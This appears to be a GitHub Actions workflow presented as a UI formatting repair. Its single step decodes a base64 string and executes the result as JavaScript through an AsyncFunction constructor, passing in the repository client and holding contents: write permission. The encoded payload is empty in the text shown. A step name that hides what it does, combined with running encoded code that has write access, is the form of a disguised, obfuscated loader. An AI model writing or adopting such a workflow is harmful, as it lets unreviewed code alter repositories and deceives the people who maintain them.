name: Repair format UI

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/repair-format-ui.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - name: Restore rich-format controls and palettes
        uses: actions/github-script@v7
        with:
          script: |
            const payload = '';
            const code = Buffer.from(payload, 'base64').toString('utf8');
            const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
            await new AsyncFunction('github', 'context', 'Buffer', code)(github, context, Buffer);
